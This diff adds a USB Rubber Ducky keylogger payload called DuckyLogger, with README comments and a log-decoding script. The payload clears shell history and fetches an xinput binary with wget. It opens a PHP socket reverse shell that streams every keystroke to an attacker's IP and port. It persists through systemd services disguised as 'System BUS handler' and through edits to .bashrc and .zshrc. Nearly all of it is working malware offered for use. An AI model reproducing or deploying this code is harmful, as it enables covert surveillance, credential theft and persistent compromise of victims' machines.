@@ -1,0 +1,203 @@
+REM ####################
+REM README
+REM ####################
+REM ## About:
+REM * Title: DuckyLogger
+REM * Description: Key logger which sends each and every key stroke of target remotely/locally.
+REM * AUTHOR: drapl0n
+REM * Version: 1.0
+REM * Category: Credentials
+REM * Target: Unix-like operating systems with systemd.
+REM * Attackmodes: HID
+REM 
+REM ## DuckyLogger: DuckyLogger is a Key Logger which captures every key stroke of traget and send them to attacker.
+REM 
+REM ### Features:
+REM * Live keystroke capturing.
+REM * Detailed key logs.
+REM * Persistent
+REM * Autostart payload on boot.
+REM 
+REM ### Workflow:
+REM * Encoding payload and injecting on target's system.
+REM * Checks whether internet is connected to the target system. 
+REM * If internet is connected then it sends raw keystrokes to attacker. 
+REM * Attacker processes raw keystrokes. 
+REM 
+REM ### Changes to be made in payload:
+REM * Replace ip(0.0.0.0) and port number(4444) with your servers ip address and port number on line no `43`.
+REM * Increase/Decrease time interval to restart service periodically (Default is 15 mins), on line no `59`.
+REM 
+REM ### Usage:
+REM 1. Encode payload.txt and inject into target's system.
+REM 2. Start netcat listner on attacking system:
+REM 
+REM * `nc -lvp <port number> > <log filename>` use this command to create new logfile with raw keystrokes.
+REM * `nc -lvp <port number> >> <log filename>` use this command to append raw keystrokes to existing logfile.
+REM 3. Process raw keystrokes using DuckyLoggerDecoder utility:
+REM ```
+REM ./duckyLoggerDecoder
+REM DuckyLoggerDecoder is used to decode raw key strokes acquired by duckyLogger.
+REM 
+REM Usage: 
+REM Decode captured log:    [./duckyLoggerDecoder -f <Logfile> -m <mode> -o <output file>]
+REM 
+REM Options:
+REM -f      Specify Log file.
+REM -m      Select Mode(normal|informative)
+REM -o      Specify Output file.
+REM -h      For this banner.
+REM ```
+REM 
+REM #### Support me if you like my work:
+REM * https://twitter.com/drapl0n
+REM Title: DuckyLogger
+REM Description: Key logger which sends each and every key stroke of target remotely/locally.
+REM AUTHOR: drapl0n
+REM Version: 1.0
+REM Category: Credentials
+REM Target: Unix-like operating systems with systemd
+REM Attackmodes: HID
+
+REM [Note]
+REM Visit https://github.com/drapl0n/DuckyLogger for usage and other important instructions.
+
+REM ####################
+REM PAYLOAD
+REM ####################
+REM [keeping tracks clear]
+DELAY 500
+CTRL-ALT t
+DELAY 400
+STRING unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
+ENTER
+DELAY 100
+
+REM [creating key logging mechanism]
+STRING mkdir /var/tmp/.system
+ENTER
+DELAY 100
+STRING echo "/var/tmp/.system/./xinput list | grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' | xargs -P0 -n1 /var/tmp/.system/./xinput test" > /var/tmp/.system/sys 
+ENTER
+DELAY 100
+STRING chmod +x /var/tmp/.system/sys
+ENTER
+DELAY 100
+
+REM [importing xinput]
+STRING cd /var/tmp/.system/
+ENTER
+DELAY 100
+STRING wget --no-check-certificate --content-disposition https://github.com/drapl0n/DuckyLogger/blob/main/xinput\?raw=true
+ENTER
+DELAY 2500
+STRING chmod +x xinput
+ENTER
+DELAY 100
+
+REM [creating reverse shell]
+STRING echo -e "while :\ndo\n\tping -c 5 0.0.0.0\n\tif [ $? -eq 0 ]; then\n\t\tphp -r '\$sock=fsockopen(\"0.0.0.0\",4444);exec("\"/var/tmp/.system/sys -i "<&3 >&3 2>&3"\"");'\n\tfi\ndone" >  /var/tmp/.system/systemBus
+ENTER
+DELAY 100
+STRING chmod +x /var/tmp/.system/systemBus
+ENTER
+DELAY 100
+
+REM [creating systemd service to execute payload on boot]
+STRING mkdir -p ~/.config/systemd/user
+ENTER
+DELAY 200
+STRING echo -e "[Unit]\nDescription= System BUS handler\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/systemBus -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/systemBUS.service
+ENTER
+DELAY 100
+
+REM [creating reboot script incase if listner stops or targets internet connection gets lost] 
+STRING echo "while true; do systemctl --user restart systemBUS.service; sleep 15m; done" > /var/tmp/.system/reboot
+ENTER
+DELAY 100
+STRING chmod +x /var/tmp/.system/reboot
+ENTER
+DELAY 100
+
+REM [creating systemd service to execute payload on boot]
+STRING echo -e "[Unit]\nDescription= System BUS handler reboot.\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/reboot -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/reboot.service
+ENTER
+DELAY 100
+
+REM [enabling service]
+STRING systemctl --user daemon-reload
+ENTER
+DELAY 300
+STRING systemctl --user enable --now systemBUS.service
+ENTER
+DELAY 150
+STRING systemctl --user start --now systemBUS.service
+ENTER
+DELAY 150
+STRING systemctl --user enable --now reboot.service
+ENTER
+DELAY 150
+STRING systemctl --user start --now reboot.service
+ENTER
+DELAY 100
+
+REM [autostarting service on terminal/shell launch]
+STRING echo -e "ls -a | grep 'zshrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"systemctl --user enable --now reboot.service && systemctl --user enable --now systemBUS.service\" >> ~/.zshrc\nfi\n\nls -a | grep 'bashrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"systemctl --user enable --now reboot.service && systemctl --user enable --now systemBUS.service\" >> ~/.bashrc\nfi" > ~/tmmmp
+ENTER
+DELAY 100
+STRING chmod +x ~/tmmmp && cd ~/ && ./tmmmp && rm tmmmp && exit
+ENTER
+
+REM ####################
+REM DUCKY DECODER USAGE
+REM ####################
+REM usage () { 
+REM 	echo -e "DuckyLoggerDecoder is used to decode raw key strokes acquired by duckyLogger.\n"
+REM 	echo -e "Usage: \nDecode captured log:\t[./duckyLoggerDecoder -f <Logfile> -m <mode> -o <output file>]"; 
+REM 	echo -e "\nOptions:"
+REM 	echo -e "-f\tSpecify Log file."
+REM 	echo -e "-m\tSelect Mode(normal|informative)"
+REM 	echo -e "-o\tSpecify Output file."
+REM 	echo -e "-h\tFor this banner."
+REM }
+REM while getopts o:m:f:h: flag
+REM do
+REM     case "${flag}" in
+REM         o) output=$OPTARG ;;
+REM         m) mode=$OPTARG ;;
+REM 	f) filename=$OPTARG ;;
+REM 	h) help=$OPTARG ;;
+REM 	*)
+REM 			usage
+REM                         exit 1
+REM     esac
+REM done
+REM 
+REM if [ -z "$output" ] && [ -z "$filename" ]; then
+REM 	usage
+REM         exit 1
+REM fi
+REM if [ -z "$filename" ]; then
+REM         echo -e "DuckyLogDecoder: Missing option \"-f\"(Log file not specified).\nUse \"-h\" for more information." >&2
+REM 	exit 1
+REM fi
+REM if [ -z "$output" ]; then
+REM         echo -e "DuckyLogDecoder: Missing option \"-o\"(Output file not specified).\nUse \"-h\" for help." >&2
+REM 	exit 1
+REM fi
+REM if [ -z "$mode" ]; then
+REM         echo -e "DuckyLogDecoder: Missing option \"-m\"(Mode not specified).\nUse \"-h\" for help." >&2
+REM         exit 1
+REM fi
+REM if [ "$mode" != "informative" ] && [ "$mode" != "normal" ]; then
+REM         echo -e "DuckyLogDecoder: Invalid mode \"$mode\".\nUse \"-h\" for help." >&2
+REM         exit 1
+REM fi
+REM if [ "$mode" == "normal" ] ; then
+REM         awk 'BEGIN{while (("xmodmap -pke" | getline) > 0) k[$2]=$4} {print $0 "[" k [$NF] "]"}' $filename | grep press | awk '{print $4}' > $output
+REM         exit 1
+REM fi
+REM if [ "$mode" == "informative" ] ; then
+REM         awk 'BEGIN{while (("xmodmap -pke" | getline) > 0) k[$2]=$4} {print $0 "[" k [$NF] "]"}' $filename > $output
+REM         exit 1
+REM fi
